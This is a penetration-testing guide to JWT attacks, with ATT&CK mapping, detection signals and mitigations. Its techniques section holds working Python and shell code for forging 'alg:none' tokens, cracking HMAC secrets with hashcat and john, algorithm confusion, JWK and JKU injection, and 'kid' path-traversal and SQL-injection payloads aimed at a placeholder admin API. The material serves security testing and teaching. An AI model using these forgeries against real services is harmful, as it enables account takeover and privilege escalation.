% Filename: 04-web-testing/auth-session/jwt.md
% Display name: JWT Attacks
% Last update: 2026-02-11
% ATT&CK Tactics: TA0006 (Credential Access), TA0005 (Defense Evasion)
% ATT&CK Techniques: T1134 (Access Token Manipulation), T1539 (Steal Web Session Cookie)
% Authors: @TristanInSec

# JWT Attacks

## Overview

JSON Web Tokens (JWTs) are a compact, URL-safe means of transferring claims between parties. A JWT has three base64url-encoded parts separated by dots: header, payload, and signature (`header.payload.signature`). JWTs are widely used for authentication and session management in web applications and APIs.

JWT security depends entirely on proper signature verification. When applications fail to validate signatures correctly, accept weak algorithms, or use guessable secrets, attackers can forge tokens to impersonate any user or escalate privileges.

## ATT&CK Mapping

- **Tactic:** TA0006 - Credential Access
- **Technique:** T1539 - Steal Web Session Cookie
- **Tactic:** TA0005 - Defense Evasion
- **Technique:** T1134 - Access Token Manipulation

## Prerequisites

- Target application uses JWTs (typically in `Authorization: Bearer` header or cookies)
- Ability to intercept and modify HTTP requests (Burp Suite, browser dev tools)
- A valid JWT to analyze (obtained by logging in as any user)

## Detection Methodology

### Identifying JWTs

JWTs are recognizable by their three-part dot-separated structure. The header and payload are base64url-encoded JSON:

```bash
# Decode a JWT (does not verify signature)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" \
  | cut -d. -f1 | base64 -d 2>/dev/null; echo
# Output: {"alg":"HS256","typ":"JWT"}

echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c" \
  | cut -d. -f2 | base64 -d 2>/dev/null; echo
# Output: {"sub":"1234567890","name":"John Doe","iat":1516239022}
```

Look for JWTs in:

- `Authorization: Bearer <token>` headers
- Cookies (especially `access_token`, `token`, `jwt`, `session`)
- URL parameters
- POST body fields
- `localStorage`/`sessionStorage` (inspect in browser dev tools)

### Analyzing the Header

The `alg` field in the header determines the attack surface:

```text
HS256, HS384, HS512  — HMAC with symmetric secret (crackable)
RS256, RS384, RS512  — RSA with asymmetric key pair
ES256, ES384, ES512  — ECDSA with asymmetric key pair
PS256, PS384, PS512  — RSA-PSS with asymmetric key pair
none                 — no signature (extremely dangerous if accepted)
```

## Techniques

### Algorithm None Attack

If the server accepts `"alg":"none"`, the signature is not verified — any payload is accepted.

```python
# Python 3 (standard library only)
import base64, json

header = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"sub":"admin","role":"admin","iat":1516239022}).encode()).rstrip(b'=')
token = header.decode() + "." + payload.decode() + "."
print(token)
```

```bash
# curl
# https://curl.se/
# Use the forged token
curl -s -H "Authorization: Bearer <forged_token>" http://target.com/api/admin
```

Variations that may bypass naive filters:

```text
"alg":"none"
"alg":"None"
"alg":"NONE"
"alg":"nOnE"
```

### HMAC Secret Cracking

If the JWT uses HS256/HS384/HS512, the security depends on the secret's strength. Weak secrets can be cracked offline.

```bash
# hashcat
# https://hashcat.net/hashcat/
# Crack JWT secret (mode 16500)
# Put the full JWT (header.payload.signature) in a file
echo "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.signature_here" > jwt.txt

hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

```bash
# john
# https://www.openwall.com/john/
# John the Ripper can also crack JWTs
echo "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.signature_here" > jwt.txt

john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256
```

Once the secret is recovered, forge tokens with any payload:

```python
# Python 3 with PyJWT
# pip3 install PyJWT
import jwt

token = jwt.encode({"sub": "admin", "role": "admin"}, "cracked_secret", algorithm="HS256")
print(token)
```

### Algorithm Confusion (RS256 to HS256)

If the server uses RS256 (asymmetric) but also accepts HS256 (symmetric), the attacker can:

1. Obtain the server's public key (often available at `/.well-known/jwks.json` or in the certificate)
2. Sign a token using HS256 with the public key as the HMAC secret

The server verifies HMAC(public_key, token) — which succeeds because it uses the public key as the symmetric secret.

```bash
# curl
# https://curl.se/
# Step 1: Obtain the public key
curl -s http://target.com/.well-known/jwks.json
# Or extract from TLS certificate:
openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout > public.pem
```

```python
# Python 3 with PyJWT
# Step 2: Sign with HS256 using the public key as secret
import jwt

with open("public.pem", "r") as f:
    public_key = f.read()

# PyJWT >= 2.4.0 blocks this by default — use options to override
token = jwt.encode(
    {"sub": "admin", "role": "admin"},
    public_key,
    algorithm="HS256",
    headers={"alg": "HS256", "typ": "JWT"}
)
print(token)
```

### JWK Header Injection

The JWT header can include a `jwk` (JSON Web Key) parameter containing the key used to verify the signature. If the server trusts this embedded key, the attacker provides their own key pair:

```python
# Python 3
import jwt, json
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.backends import default_backend

# Generate attacker's key pair
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
public_key = private_key.public_key()

# Export public key as JWK for the header
public_numbers = public_key.public_numbers()
import base64

def int_to_base64url(n):
    b = n.to_bytes((n.bit_length() + 7) // 8, byteorder='big')
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

jwk = {
    "kty": "RSA",
    "n": int_to_base64url(public_numbers.n),
    "e": int_to_base64url(public_numbers.e),
    "use": "sig"
}

# Sign the token with attacker's private key, embed attacker's public key in header
token = jwt.encode(
    {"sub": "admin", "role": "admin"},
    private_key,
    algorithm="RS256",
    headers={"jwk": jwk}
)
print(token)
```

### KID (Key ID) Injection

The `kid` header parameter tells the server which key to use for verification. If this value is used in a file path or database query without sanitization:

**Path traversal via kid:**

```python
# Python 3 with PyJWT
import jwt

# kid pointing to a file with known content (e.g., /dev/null = empty)
token = jwt.encode(
    {"sub": "admin", "role": "admin"},
    "",  # empty string matches empty file
    algorithm="HS256",
    headers={"kid": "../../../dev/null"}
)
print(token)
```

**SQL injection via kid:**

```bash
# If kid is used in a SQL query: SELECT key FROM keys WHERE kid='<kid>'
# Inject to return a known value
kid: ' UNION SELECT 'attacker_controlled_secret' --
```

Then sign the token with `attacker_controlled_secret` as the HMAC key.

### JKU (JWK Set URL) Injection

The `jku` header points to a URL hosting a JWK Set. If the server fetches keys from attacker-controlled URLs:

1. Generate a key pair
2. Host the public key as a JWK Set on an attacker-controlled server
3. Set `jku` in the JWT header to point to the attacker's JWK Set
4. Sign the token with the attacker's private key

The server fetches the attacker's public key and verifies the signature successfully.

### Token Claim Manipulation

Even without forging signatures, test if the server validates claim values:

```bash
# Decode the token, modify claims, re-encode
# If the server doesn't verify the signature (rare but happens):
# Change "role":"user" to "role":"admin"
# Change "sub":"42" to "sub":"1"
# Remove "exp" claim to create a token that never expires
# Set "exp" to a far-future timestamp
```

## Detection Methods

### Network-Based Detection

- JWTs with `"alg":"none"` or case variations in requests
- JWTs with `jwk`, `jku`, or unusual `kid` values in headers
- Requests to `/.well-known/jwks.json` followed by algorithm confusion patterns
- Same JWT used from different IP addresses (token theft/replay)

### Host-Based Detection

- JWT verification failures in application logs (signature mismatch, unknown algorithm)
- Outbound requests from the server to unexpected URLs (jku exploitation)
- File access attempts from JWT verification logic (kid path traversal)
- SQL errors from JWT verification code (kid SQL injection)

## Mitigation Strategies

- **Explicitly whitelist algorithms** — the server must only accept the specific algorithms it uses. Never allow `none`. Most JWT libraries support an `algorithms` parameter
- **Use asymmetric algorithms** — RS256/ES256 are preferred over HS256 because the signing key (private) and verification key (public) are different, eliminating secret cracking attacks
- **Use strong secrets for HMAC** — if using HS256, the secret must be at least 256 bits of cryptographic randomness, not a dictionary word
- **Ignore embedded keys** — never trust `jwk`, `jku`, or `kid` from the token header. Use server-side key configuration only
- **Validate all claims** — verify `exp` (expiration), `iss` (issuer), `aud` (audience), and `iat` (issued at). Reject expired tokens
- **Short token lifetimes** — use short-lived access tokens (5-15 minutes) with refresh tokens for renewal

## References

### Pentest Guides & Research

- [PortSwigger Web Security Academy - JWT Attacks](https://portswigger.net/web-security/jwt)
- [OWASP - Testing JSON Web Tokens](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens)

### MITRE ATT&CK

- [T1134 - Access Token Manipulation](https://attack.mitre.org/techniques/T1134/)
- [T1539 - Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539/)
